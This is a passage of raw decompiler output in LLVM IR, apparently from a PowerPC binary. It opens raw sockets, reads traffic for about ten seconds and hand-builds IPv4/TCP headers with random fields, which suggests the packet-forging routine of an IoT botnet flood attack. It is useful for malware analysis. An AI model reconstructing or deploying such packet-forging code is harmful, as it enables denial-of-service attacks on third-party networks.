  %v0_10003ac0 = load i32, i32* @r29, align 4
  store i32 %v0_10003ac0, i32* %r3.global-to-local, align 4
  store i32 268450504, i32* @lr, align 4
  %v4_10003ac4 = inttoptr i32 %v0_10003ab0 to i32*
  %v5_10003ac4 = call i32 @function_1000235c(i32 %v0_10003ac0, i32* %v4_10003ac4, i32 13, i32 1)
  %v0_10003ac8 = load i32, i32* @r28, align 4
  %v1_10003ad4 = urem i32 %v5_10003ac4, 256
  %v0_10003ad8 = load i32, i32* @r29, align 4
  store i32 %v0_10003ad8, i32* %r3.global-to-local, align 4
  store i32 268450528, i32* @lr, align 4
  %v4_10003adc = inttoptr i32 %v0_10003ac8 to i32*
  %v5_10003adc = call i32 @function_1000235c(i32 %v0_10003ad8, i32* %v4_10003adc, i32 14, i32 1)
  %v0_10003ae0 = load i32, i32* @r28, align 4
  %v1_10003aec = urem i32 %v5_10003adc, 256
  %v0_10003af0 = load i32, i32* @r29, align 4
  store i32 %v0_10003af0, i32* %r3.global-to-local, align 4
  store i32 268450552, i32* @lr, align 4
  %v4_10003af4 = inttoptr i32 %v0_10003ae0 to i32*
  %v5_10003af4 = call i32 @function_1000235c(i32 %v0_10003af0, i32* %v4_10003af4, i32 15, i32 1)
  %v0_10003af8 = load i32, i32* @r28, align 4
  %v1_10003b04 = urem i32 %v5_10003af4, 256
  %v0_10003b08 = load i32, i32* @r29, align 4
  store i32 %v0_10003b08, i32* %r3.global-to-local, align 4
  store i32 268450576, i32* @lr, align 4
  %v4_10003b0c = inttoptr i32 %v0_10003af8 to i32*
  %v5_10003b0c = call i32 @function_1000235c(i32 %v0_10003b08, i32* %v4_10003b0c, i32 16, i32 1)
  %v0_10003b18 = load i32, i32* @r28, align 4
  %v1_10003b1c = urem i32 %v5_10003b0c, 256
  %v0_10003b20 = load i32, i32* @r29, align 4
  store i32 %v0_10003b20, i32* %r3.global-to-local, align 4
  store i32 268450600, i32* @lr, align 4
  %v4_10003b24 = inttoptr i32 %v0_10003b18 to i32*
  %v5_10003b24 = call i32 @function_1000235c(i32 %v0_10003b20, i32* %v4_10003b24, i32 0, i32 768)
  %v0_10003b28 = load i32, i32* @r28, align 4
  store i32 %v5_10003b24, i32* %r25.global-to-local, align 4
  %v0_10003b38 = load i32, i32* @r29, align 4
  store i32 %v0_10003b38, i32* %r3.global-to-local, align 4
  store i32 268450624, i32* @lr, align 4
  %v4_10003b3c = inttoptr i32 %v0_10003b28 to i32*
  %v5_10003b3c = call i32 @function_1000235c(i32 %v0_10003b38, i32* %v4_10003b3c, i32 1, i32 1)
  %v1_10003b44 = urem i32 %v5_10003b3c, 256
  store i32 %v1_10003b44, i32* %r27.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268450644, i32* @lr, align 4
  %v3_10003b50 = call i32 @function_1000c1bc(i32 2, i32 3, i32 6)
  store i32 %v3_10003b50, i32* %r3.global-to-local, align 4
  %v3_10003b54 = icmp eq i32 %v3_10003b50, -1
  store i1 %v3_10003b54, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_10003b50, i32* %r24.global-to-local, align 4
  br i1 %v3_10003b54, label %dec_label_pc_10003d14, label %dec_label_pc_10003b60

dec_label_pc_10003b60:                            ; preds = %dec_label_pc_10003968
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_10003b6c = ptrtoint i32* %stack_var_-408 to i32
  store i32 4, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-408, align 4
  store i32 268450684, i32* @lr, align 4
  %v5_10003b78 = call i32 @function_1000c180(i32 0, i32 3, i32 %v2_10003b6c, i32 4, i32 4)
  store i32 %v5_10003b78, i32* %r3.global-to-local, align 4
  %v3_10003b7c = icmp eq i32 %v5_10003b78, -1
  store i1 %v3_10003b7c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10003b7c, label %dec_label_pc_10003d0c, label %dec_label_pc_10003b84

dec_label_pc_10003b84:                            ; preds = %dec_label_pc_10003b60
  %v0_10003b84 = load i32, i32* %r21.global-to-local, align 4
  %v1_10003b84 = icmp slt i32 %v0_10003b84, 0
  %v3_10003b84 = icmp eq i32 %v0_10003b84, 0
  store i1 %v1_10003b84, i1* %cr3_lt.global-to-local, align 1
  store i1 %v3_10003b84, i1* %cr3_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-408, align 4
  %v0_10003b90 = load i32, i32* @r31, align 4
  %v1_10003b90 = urem i32 %v0_10003b90, 65536
  store i32 %v1_10003b90, i32* %r19.global-to-local, align 4
  %tmp49 = icmp slt i32 %v0_10003b84, 1
  br i1 %tmp49, label %dec_label_pc_10003eac, label %dec_label_pc_10003b98

dec_label_pc_10003b98:                            ; preds = %dec_label_pc_10003b84
  %v4_10003b98 = sext i16 %v5_10003a84 to i32
  store i32 %v4_10003b98, i32* %r9.global-to-local, align 4
  store i32 65535, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cr4_eq.global-to-local, align 1
  %v2_10003c3c = ptrtoint i32* %stack_var_-368 to i32
  %v2_10003c48 = ptrtoint i32* %stack_var_-384 to i32
  %v2_10003c4c = ptrtoint i32* %stack_var_-404 to i32
  %v4_10003c84 = zext i16 %tmp13 to i32
  %v1_10003cb4 = and i32 %tmp, 1179648
  %v3_10003dc8 = icmp eq i32 %v1_10003a5c, 0
  %v4_10003de8 = sext i8 %v5_10003a10 to i32
  %v4_10003df0 = sext i8 %v5_10003a48 to i32
  %v1_10003cb8 = and i32 %tmp, 327680
  %v3_10003cb8 = icmp eq i32 %v1_10003cb8, 0
  %v4_10003cc0 = icmp eq i32 %v1_10003cb4, 1179648
  br label %dec_label_pc_10003ba4

dec_label_pc_10003ba4:                            ; preds = %dec_label_pc_10003e98, %dec_label_pc_10003ccc, %dec_label_pc_10003b98
  %v0_10003ba4 = load i32, i32* %r25.global-to-local, align 4
  %v1_10003ba4 = add i32 %v0_10003ba4, 40
  store i32 %v1_10003ba4, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_10003ba8

dec_label_pc_10003ba8:                            ; preds = %dec_label_pc_10003ca4, %dec_label_pc_10003ba4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268450744, i32* @lr, align 4
  %v3_10003bb4 = call i32 @function_1000c1bc(i32 2, i32 1, i32 0)
  store i32 %v3_10003bb4, i32* %r3.global-to-local, align 4
  %v3_10003bb8 = icmp eq i32 %v3_10003bb4, -1
  store i1 %v3_10003bb8, i1* %cr7_eq.global-to-local, align 1
  store i32 %v3_10003bb4, i32* %r28.global-to-local, align 4
  br i1 %v3_10003bb8, label %dec_label_pc_10003e98, label %dec_label_pc_10003bc4

dec_label_pc_10003bc4:                            ; preds = %dec_label_pc_10003ba8
  store i32 3, i32* @r4, align 4
  store i32 268450772, i32* @lr, align 4
  %v1_10003bd0 = call i32 @function_1000b2c0(i32 3)
  store i32 4, i32* @r4, align 4
  %v0_10003bdc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10003bdc, i32* %r3.global-to-local, align 4
  store i32 268450792, i32* @lr, align 4
  %v2_10003be4 = call i32 @function_1000b2c0(i32 %v0_10003bdc)
  store i32 %v2_10003be4, i32* %r3.global-to-local, align 4
  %v3_10003be8 = load i32, i32* %stack_var_-408, align 4
  store i32 2, i32* %r9.global-to-local, align 4
  %v1_10003bf0 = mul i32 %v3_10003be8, 24
  store i32 %v1_10003bf0, i32* %r0.global-to-local, align 4
  %v0_10003bf8 = load i32, i32* %r20.global-to-local, align 4
  %v2_10003bf8 = add i32 %v0_10003bf8, %v1_10003bf0
  store i32 %v2_10003bf8, i32* %r11.global-to-local, align 4
  %v1_10003bfc = add i32 %v2_10003bf8, 20
  %v2_10003bfc = inttoptr i32 %v1_10003bfc to i8*
  %v3_10003bfc = load i8, i8* %v2_10003bfc, align 1
  %v4_10003bfc = zext i8 %v3_10003bfc to i32
  store i32 %v4_10003bfc, i32* %r9.global-to-local, align 4
  %v3_10003c00 = icmp eq i8 %v3_10003bfc, 31
  store i1 %v3_10003c00, i1* %cr7_eq.global-to-local, align 1
  %tmp50 = icmp ult i8 %v3_10003bfc, 32
  %v1_10003cd8 = add i32 %v2_10003bf8, 16
  %v2_10003cd8 = inttoptr i32 %v1_10003cd8 to i32*
  %v3_10003cd8 = load i32, i32* %v2_10003cd8, align 4
  br i1 %tmp50, label %dec_label_pc_10003cd8, label %dec_label_pc_10003c08

dec_label_pc_10003c08:                            ; preds = %dec_label_pc_10003bc4
  store i32 %v3_10003cd8, i32* %r0.global-to-local, align 4
  %v0_10003c10 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10003c10, label %dec_label_pc_10003d00, label %dec_label_pc_10003c14

dec_label_pc_10003c14:                            ; preds = %dec_label_pc_10003cd8, %dec_label_pc_10003c08
  %stack_var_-396.0 = phi i32 [ %v2_10003cf4, %dec_label_pc_10003cd8 ], [ %v3_10003cd8, %dec_label_pc_10003c08 ]
  store i32 %v4_10003b98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10003c1c

dec_label_pc_10003c1c:                            ; preds = %dec_label_pc_10003d00, %dec_label_pc_10003c14
  %stack_var_-396.1 = phi i32 [ %stack_var_-396.2, %dec_label_pc_10003d00 ], [ %stack_var_-396.0, %dec_label_pc_10003c14 ]
  %storemerge = phi i16 [ %v1_10003d00, %dec_label_pc_10003d00 ], [ %v5_10003a84, %dec_label_pc_10003c14 ]
  %v0_10003c24 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10003c24, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10003c2c.76 to i32), i32* @lr, align 4
  %v0_10003c28 = call i32 @function_1000bfbc()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 268450868, i32* @lr, align 4
  %v0_10003c30 = call i32 @function_1000b7c0()
  store i32 %v0_10003c30, i32* %r3.global-to-local, align 4
  store i32 %v0_10003c30, i32* @r31, align 4
  %v4_10003c78 = icmp eq i32 %tmp14, %stack_var_-396.1
  %v4_10003c88 = zext i16 %storemerge to i32
  %v4_10003c8c = icmp eq i16 %storemerge, %tmp13
  %v4_10003c78.not = xor i1 %v4_10003c78, true
  br label %dec_label_pc_10003c38

dec_label_pc_10003c38:                            ; preds = %dec_label_pc_10003c94, %dec_label_pc_10003c1c
  store i32 16, i32* %r0.global-to-local, align 4
  store i32 %v2_10003c48, i32* %r7.global-to-local, align 4
  store i32 %v2_10003c4c, i32* %r8.global-to-local, align 4
  %v0_10003c50 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10003c50, i32* %r3.global-to-local, align 4
  store i32 16, i32* %stack_var_-404, align 4
  store i32 268450908, i32* @lr, align 4
  %v6_10003c58 = call i32 @function_1000c0c8(i32 %v0_10003c50, i32 %v2_10003c3c, i32 256, i32 16384, i32 %v2_10003c48, i32 %v2_10003c4c)
  store i32 %v6_10003c58, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_10003c64 = icmp eq i32 %v6_10003c58, -1
  store i1 %v3_10003c64, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10003c64, label %dec_label_pc_10003d14, label %dec_label_pc_10003c70

dec_label_pc_10003c70:                            ; preds = %dec_label_pc_10003c38
  store i32 %tmp14, i32* %r10.global-to-local, align 4
  store i32 %stack_var_-396.1, i32* %r0.global-to-local, align 4
  store i1 %v4_10003c78, i1* %cr7_eq.global-to-local, align 1
  %tmp51 = icmp ult i32 %v6_10003c58, 41
  %or.cond = or i1 %tmp51, %v4_10003c78.not
  br i1 %or.cond, label %dec_label_pc_10003c94, label %dec_label_pc_10003c84

dec_label_pc_10003c84:                            ; preds = %dec_label_pc_10003c70
  store i32 %v4_10003c84, i32* %r0.global-to-local, align 4
  store i32 %v4_10003c88, i32* %r8.global-to-local, align 4
  store i1 %v4_10003c8c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10003c8c, label %dec_label_pc_10003cb0, label %dec_label_pc_10003c94

dec_label_pc_10003c94:                            ; preds = %dec_label_pc_10003c70, %dec_label_pc_10003cc8, %dec_label_pc_10003c84
  store i32 268450968, i32* @lr, align 4
  %v0_10003c94 = call i32 @function_1000b7c0()
  %v0_10003c98 = load i32, i32* @r31, align 4
  %v2_10003c98 = sub i32 %v0_10003c94, %v0_10003c98
  store i32 %v2_10003c98, i32* %r3.global-to-local, align 4
  %v3_10003c9c = icmp eq i32 %v2_10003c98, 10
  store i1 %v3_10003c9c, i1* %cr7_eq.global-to-local, align 1
  %tmp52 = icmp slt i32 %v2_10003c98, 11
  br i1 %tmp52, label %dec_label_pc_10003c38, label %dec_label_pc_10003ca4

dec_label_pc_10003ca4:                            ; preds = %dec_label_pc_10003c94
  %v0_10003ca4 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10003ca4, i32* %r3.global-to-local, align 4
  store i32 268450988, i32* @lr, align 4
  %v0_10003ca8 = call i32 @function_1000b3f0()
  store i32 %v0_10003ca8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003ba8

dec_label_pc_10003cb0:                            ; preds = %dec_label_pc_10003c84
  store i32 %tmp, i32* %r9.global-to-local, align 4
  store i32 %v1_10003cb4, i32* %r11.global-to-local, align 4
  store i32 1179648, i32* %r0.global-to-local, align 4
  store i1 %v4_10003cc0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10003cc0, label %dec_label_pc_10003d74, label %dec_label_pc_10003cc8

dec_label_pc_10003cc8:                            ; preds = %dec_label_pc_10003cb0
  br i1 %v3_10003cb8, label %dec_label_pc_10003c94, label %dec_label_pc_10003ccc

dec_label_pc_10003ccc:                            ; preds = %dec_label_pc_10003cc8
  %v0_10003ccc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10003ccc, i32* %r3.global-to-local, align 4
  store i32 268451028, i32* @lr, align 4
  %v0_10003cd0 = call i32 @function_1000b3f0()
  store i32 %v0_10003cd0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003ba4

dec_label_pc_10003cd8:                            ; preds = %dec_label_pc_10003bc4
  store i32 %v3_10003cd8, i32* %r29.global-to-local, align 4
  %v0_10003cdc = call i32 @function_10007ca8()
  store i32 %v0_10003cdc, i32* %r3.global-to-local, align 4
  %v3_10003ce0 = load i32, i32* %stack_var_-408, align 4
  %v1_10003ce4 = mul i32 %v3_10003ce0, 24
  %v1_10003ce8 = load i32, i32* %r20.global-to-local, align 4
  %v2_10003ce8 = add i32 %v1_10003ce8, %v1_10003ce4
  store i32 %v2_10003ce8, i32* %r9.global-to-local, align 4
  %v1_10003cec = add i32 %v2_10003ce8, 20
  %v2_10003cec = inttoptr i32 %v1_10003cec to i8*
  %v3_10003cec = load i8, i8* %v2_10003cec, align 1
  %v4_10003cec = zext i8 %v3_10003cec to i32
  store i32 %v4_10003cec, i32* %r0.global-to-local, align 4
  %tmp53 = urem i8 %v3_10003cec, 64
  %v2_10003cf0 = zext i8 %tmp53 to i32
  %v3_10003cf0 = lshr i32 %v0_10003cdc, %v2_10003cf0
  store i32 %v3_10003cf0, i32* %r3.global-to-local, align 4
  %v0_10003cf4 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003cf4 = add i32 %v3_10003cf0, %v0_10003cf4
  store i32 %v2_10003cf4, i32* %r29.global-to-local, align 4
  %v0_10003cfc = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10003cfc, label %dec_label_pc_10003d00, label %dec_label_pc_10003c14

dec_label_pc_10003d00:                            ; preds = %dec_label_pc_10003cd8, %dec_label_pc_10003c08
  %stack_var_-396.2 = phi i32 [ %v2_10003cf4, %dec_label_pc_10003cd8 ], [ %v3_10003cd8, %dec_label_pc_10003c08 ]
  %v0_10003d00 = call i32 @function_10007ca8()
  %v1_10003d00 = trunc i32 %v0_10003d00 to i16
  store i32 %v0_10003d00, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003c1c

dec_label_pc_10003d0c:                            ; preds = %dec_label_pc_10003b60
  %v0_10003d0c = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10003d0c, i32* %r3.global-to-local, align 4
  store i32 268451092, i32* @lr, align 4
  %v0_10003d10 = call i32 @function_1000b3f0()
  store i32 %v0_10003d10, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003d14

dec_label_pc_10003d14:                            ; preds = %dec_label_pc_10003c38, %dec_label_pc_10003968, %dec_label_pc_10003d0c
  store i32 %v0_10003980, i32* %r0.global-to-local, align 4
  %v1_10003d28 = call %0 @__asm_mtcrf(i32 56, i32 %v0_10003970)
  store i32 %v0_100039b8, i32* %r28.global-to-local, align 4
  store i32 %v0_100039c0, i32* %r29.global-to-local, align 4
  %v0_10003d70 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10003d70

dec_label_pc_10003d74:                            ; preds = %dec_label_pc_10003cb0
  %v3_10003d74 = load i32, i32* %stack_var_-408, align 4
  store i32 %v3_10003d74, i32* %r29.global-to-local, align 4
  %v0_10003d78 = load i32, i32* %r26.global-to-local, align 4
  store i32 %v0_10003d78, i32* @r3, align 4
  %v0_10003d7c = load i32, i32* @r30, align 4
  %v1_10003d7c = add i32 %v0_10003d7c, 2
  %v2_10003d7c = inttoptr i32 %v1_10003d7c to i16*
  %v3_10003d7c = load i16, i16* %v2_10003d7c, align 2
  %v4_10003d7c = zext i16 %v3_10003d7c to i32
  store i32 %v4_10003d7c, i32* %r11.global-to-local, align 4
  %v1_10003d80 = mul i32 %v3_10003d74, 16
  store i32 %v1_10003d80, i32* %r9.global-to-local, align 4
  %v1_10003d84 = mul i32 %v3_10003d74, 4
  store i32 %v1_10003d84, i32* @r29, align 4
  %v1_10003d88 = load i32, i32* %r22.global-to-local, align 4
  %v3_10003d88 = add i32 %v1_10003d88, %v1_10003d80
  %v4_10003d88 = inttoptr i32 %v3_10003d88 to i32*
  store i32 %tmp14, i32* %v4_10003d88, align 4
  %v0_10003d8c = load i32, i32* %r22.global-to-local, align 4
  %v1_10003d8c = load i32, i32* %r9.global-to-local, align 4
  %v2_10003d8c = add i32 %v1_10003d8c, %v0_10003d8c
  store i32 %v2_10003d8c, i32* %r9.global-to-local, align 4
  %v0_10003d90 = load i32, i32* %r8.global-to-local, align 4
  %v1_10003d90 = trunc i32 %v0_10003d90 to i16
  %v3_10003d90 = add i32 %v2_10003d8c, 14
  %v4_10003d90 = inttoptr i32 %v3_10003d90 to i16*
  store i16 %v1_10003d90, i16* %v4_10003d90, align 2
  %v0_10003d94 = load i32, i32* @r30, align 4
  %v1_10003d94 = add i32 %v0_10003d94, 4
  %v2_10003d94 = inttoptr i32 %v1_10003d94 to i32*
  %v3_10003d94 = load i32, i32* %v2_10003d94, align 4
  store i32 %v3_10003d94, i32* %r0.global-to-local, align 4
  %v0_10003d98 = load i32, i32* %r11.global-to-local, align 4
  %v1_10003d98 = trunc i32 %v0_10003d98 to i16
  %v2_10003d98 = load i32, i32* %r9.global-to-local, align 4
  %v3_10003d98 = add i32 %v2_10003d98, 12
  %v4_10003d98 = inttoptr i32 %v3_10003d98 to i16*
  store i16 %v1_10003d98, i16* %v4_10003d98, align 2
  %v0_10003d9c = load i32, i32* %r0.global-to-local, align 4
  %v1_10003d9c = load i32, i32* %r9.global-to-local, align 4
  %v2_10003d9c = add i32 %v1_10003d9c, 4
  %v3_10003d9c = inttoptr i32 %v2_10003d9c to i32*
  store i32 %v0_10003d9c, i32* %v3_10003d9c, align 4
  %v0_10003da0 = load i32, i32* @r30, align 4
  %v1_10003da0 = add i32 %v0_10003da0, 8
  %v2_10003da0 = inttoptr i32 %v1_10003da0 to i32*
  %v3_10003da0 = load i32, i32* %v2_10003da0, align 4
  store i32 %v3_10003da0, i32* %r0.global-to-local, align 4
  %v1_10003da4 = load i32, i32* %r9.global-to-local, align 4
  %v2_10003da4 = add i32 %v1_10003da4, 8
  %v3_10003da4 = inttoptr i32 %v2_10003da4 to i32*
  store i32 %v3_10003da0, i32* %v3_10003da4, align 4
  store i32 268451244, i32* @lr, align 4
  %v0_10003da8 = call i32 @function_1000c3f0()
  store i32 %v0_10003da8, i32* %r3.global-to-local, align 4
  %v3_10003dac = load i32, i32* %stack_var_-408, align 4
  store i32 %v3_10003dac, i32* %r0.global-to-local, align 4
  %v1_10003db0 = load i32, i32* @r29, align 4
  %v2_10003db0 = load i32, i32* %r23.global-to-local, align 4
  %v3_10003db0 = add i32 %v2_10003db0, %v1_10003db0
  %v4_10003db0 = inttoptr i32 %v3_10003db0 to i32*
  store i32 %v0_10003da8, i32* %v4_10003db0, align 4
  %v0_10003db4 = load i32, i32* %r0.global-to-local, align 4
  %v1_10003db4 = mul i32 %v0_10003db4, 4
  store i32 %v1_10003db4, i32* %r0.global-to-local, align 4
  %v0_10003db8 = load i32, i32* %r23.global-to-local, align 4
  %v2_10003db8 = add i32 %v0_10003db8, %v1_10003db4
  %v3_10003db8 = inttoptr i32 %v2_10003db8 to i32*
  %v4_10003db8 = load i32, i32* %v3_10003db8, align 4
  store i32 %v4_10003db8, i32* @r31, align 4
  store i32 %v1_10003a5c, i32* %r0.global-to-local, align 4
  %v1_10003dc0 = inttoptr i32 %v4_10003db8 to i32*
  %v2_10003dc0 = load i32, i32* %v1_10003dc0, align 4
  store i32 %v2_10003dc0, i32* %r9.global-to-local, align 4
  %v1_10003dc4 = add i32 %v4_10003db8, 20
  store i32 %v1_10003dc4, i32* @r30, align 4
  store i1 %v3_10003dc8, i1* %cr7_eq.global-to-local, align 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_10003dd0 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10003dd0, i32* %r9.global-to-local, align 4
  store i32 5, i32* %r0.global-to-local, align 4
  %v1_10003dd8 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  %v0_10003ddc = load i32, i32* %r19.global-to-local, align 4
  %v1_10003ddc = trunc i32 %v0_10003ddc to i16
  %v2_10003ddc = load i32, i32* @r31, align 4
  %v3_10003ddc = add i32 %v2_10003ddc, 4
  %v4_10003ddc = inttoptr i32 %v3_10003ddc to i16*
  store i16 %v1_10003ddc, i16* %v4_10003ddc, align 2
  %v1_10003de0 = load i32, i32* @r31, align 4
  %v2_10003de0 = inttoptr i32 %v1_10003de0 to i32*
  store i32 %v1_10003dd8, i32* %v2_10003de0, align 4
  %v0_10003de4 = load i32, i32* %r26.global-to-local, align 4
  %v1_10003de4 = trunc i32 %v0_10003de4 to i16
  %v2_10003de4 = load i32, i32* @r31, align 4
  %v3_10003de4 = add i32 %v2_10003de4, 2
  %v4_10003de4 = inttoptr i32 %v3_10003de4 to i16*
  store i16 %v1_10003de4, i16* %v4_10003de4, align 2
  store i32 %v4_10003de8, i32* %r9.global-to-local, align 4
  %v2_10003dec = load i32, i32* @r31, align 4
  %v3_10003dec = add i32 %v2_10003dec, 1
  %v4_10003dec = inttoptr i32 %v3_10003dec to i8*
  store i8 %v5_10003a10, i8* %v4_10003dec, align 1
  store i32 %v4_10003df0, i32* %r0.global-to-local, align 4
  %v2_10003df4 = load i32, i32* @r31, align 4
  %v3_10003df4 = add i32 %v2_10003df4, 8
  %v4_10003df4 = inttoptr i32 %v3_10003df4 to i8*
  store i8 %v5_10003a48, i8* %v4_10003df4, align 1
  %v0_10003df8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10003df8, label %dec_label_pc_10003e04, label %dec_label_pc_10003dfc

dec_label_pc_10003dfc:                            ; preds = %dec_label_pc_10003d74
  store i32 16384, i32* %r0.global-to-local, align 4
  %v2_10003e00 = load i32, i32* @r31, align 4
  %v3_10003e00 = add i32 %v2_10003e00, 6
  %v4_10003e00 = inttoptr i32 %v3_10003e00 to i16*
  store i16 16384, i16* %v4_10003e00, align 2
  br label %dec_label_pc_10003e04

dec_label_pc_10003e04:                            ; preds = %dec_label_pc_10003d74, %dec_label_pc_10003dfc
  %v2_10003e0c = load i32, i32* @r31, align 4
  %v3_10003e0c = add i32 %v2_10003e0c, 9
  %v4_10003e0c = inttoptr i32 %v3_10003e0c to i8*
  store i8 6, i8* %v4_10003e0c, align 1
  %v3_10003e10 = load i32, i32* @global_var_1001eb10.71, align 4
  store i32 %v3_10003e10, i32* %r0.global-to-local, align 4
  %v1_10003e14 = load i32, i32* @r31, align 4
  %v2_10003e14 = add i32 %v1_10003e14, 12
  %v3_10003e14 = inttoptr i32 %v2_10003e14 to i32*
  store i32 %v3_10003e10, i32* %v3_10003e14, align 4
  %v3_10003e18 = load i32, i32* %stack_var_-408, align 4
  %v1_10003e1c = mul i32 %v3_10003e18, 16
  store i32 %v1_10003e1c, i32* %r9.global-to-local, align 4
  %v1_10003e20 = load i32, i32* %r22.global-to-local, align 4
  %v2_10003e20 = add i32 %v1_10003e20, %v1_10003e1c
  %v3_10003e20 = inttoptr i32 %v2_10003e20 to i32*
  %v4_10003e20 = load i32, i32* %v3_10003e20, align 4
  store i32 %v4_10003e20, i32* %r0.global-to-local, align 4
  store i32 %v2_10003e20, i32* %r9.global-to-local, align 4
  %v1_10003e28 = add i32 %v2_10003e20, 12
  %v2_10003e28 = inttoptr i32 %v1_10003e28 to i16*
  %v3_10003e28 = load i16, i16* %v2_10003e28, align 2
  %v4_10003e28 = zext i16 %v3_10003e28 to i32
  store i32 %v4_10003e28, i32* %r11.global-to-local, align 4
  %v1_10003e2c = load i32, i32* @r31, align 4
  %v2_10003e2c = add i32 %v1_10003e2c, 16
  %v3_10003e2c = inttoptr i32 %v2_10003e2c to i32*
  store i32 %v4_10003e20, i32* %v3_10003e2c, align 4
  %v0_10003e30 = load i32, i32* %r11.global-to-local, align 4
  %v1_10003e30 = trunc i32 %v0_10003e30 to i16
  %v2_10003e30 = load i32, i32* @r31, align 4
  %v3_10003e30 = add i32 %v2_10003e30, 20
  %v4_10003e30 = inttoptr i32 %v3_10003e30 to i16*
  store i16 %v1_10003e30, i16* %v4_10003e30, align 2
  %v0_10003e34 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003e34 = add i32 %v0_10003e34, 8
  %v2_10003e34 = inttoptr i32 %v1_10003e34 to i32*
  %v3_10003e34 = load i32, i32* %v2_10003e34, align 4
  store i32 %v3_10003e34, i32* %r0.global-to-local, align 4
  %v0_10003e38 = load i32, i32* @r30, align 4
  %v1_10003e38 = add i32 %v0_10003e38, 12
  %v2_10003e38 = inttoptr i32 %v1_10003e38 to i32*
  %v3_10003e38 = load i32, i32* %v2_10003e38, align 4
  store i32 %v3_10003e38, i32* %r11.global-to-local, align 4
  %v2_10003e3c = add i32 %v0_10003e38, 4
  %v3_10003e3c = inttoptr i32 %v2_10003e3c to i32*
  store i32 %v3_10003e34, i32* %v3_10003e3c, align 4
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_10003e44 = call i32 @__asm_rlwimi(i32 8, i32 28, i32 0, i32 3)
  store i32 %v1_10003e44, i32* %r11.global-to-local, align 4
  %v0_10003e48 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003e48 = add i32 %v0_10003e48, 14
  %v2_10003e48 = inttoptr i32 %v1_10003e48 to i16*
  %v3_10003e48 = load i16, i16* %v2_10003e48, align 2
  %v4_10003e48 = zext i16 %v3_10003e48 to i32
  store i32 %v4_10003e48, i32* %r0.global-to-local, align 4
  %v1_10003e4c = add i32 %v0_10003e48, 4
  %v2_10003e4c = inttoptr i32 %v1_10003e4c to i32*
  %v3_10003e4c = load i32, i32* %v2_10003e4c, align 4
  store i32 %v3_10003e4c, i32* %r10.global-to-local, align 4
  %v1_10003e50 = or i32 %v1_10003e44, 1114112
  store i32 %v1_10003e50, i32* %r11.global-to-local, align 4
  %v2_10003e54 = load i32, i32* @r30, align 4
  %v3_10003e54 = add i32 %v2_10003e54, 2
  %v4_10003e54 = inttoptr i32 %v3_10003e54 to i16*
  store i16 %v3_10003e48, i16* %v4_10003e54, align 2
  %v0_10003e58 = load i32, i32* %r10.global-to-local, align 4
  %v1_10003e58 = load i32, i32* @r30, align 4
  %v2_10003e58 = add i32 %v1_10003e58, 8
  %v3_10003e58 = inttoptr i32 %v2_10003e58 to i32*
  store i32 %v0_10003e58, i32* %v3_10003e58, align 4
  %v0_10003e5c = load i32, i32* %r11.global-to-local, align 4
  %v1_10003e5c = load i32, i32* @r30, align 4
  %v2_10003e5c = add i32 %v1_10003e5c, 12
  %v3_10003e5c = inttoptr i32 %v2_10003e5c to i32*
  store i32 %v0_10003e5c, i32* %v3_10003e5c, align 4
  %v0_10003e60 = call i32 @function_10007ca8()
  %v1_10003e60 = trunc i32 %v0_10003e60 to i16
  store i32 %v1_10003a98, i32* %r9.global-to-local, align 4
  %v3_10003e68 = load i32, i32* @r30, align 4
  %v4_10003e68 = add i32 %v3_10003e68, 14
  %v5_10003e68 = inttoptr i32 %v4_10003e68 to i16*
  store i16 %v1_10003e60, i16* %v5_10003e68, align 2
  %v0_10003e6c = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10003e6c, i32* @r4, align 4
  %v0_10003e70 = load i32, i32* @r31, align 4
  %v1_10003e70 = add i32 %v0_10003e70, 40
  store i32 %v1_10003e70, i32* @r3, align 4
  %v0_10003e74 = load i32, i32* @r30, align 4
  %v1_10003e74 = add i32 %v0_10003e74, 12
  %v2_10003e74 = inttoptr i32 %v1_10003e74 to i32*
  %v3_10003e74 = load i32, i32* %v2_10003e74, align 4
  store i32 %v3_10003e74, i32* %r0.global-to-local, align 4
  %v1_10003e78 = call i32 @__asm_rlwimi(i32 %v1_10003a98, i32 21, i32 10, i32 10)
  store i32 %v1_10003e78, i32* %r0.global-to-local, align 4
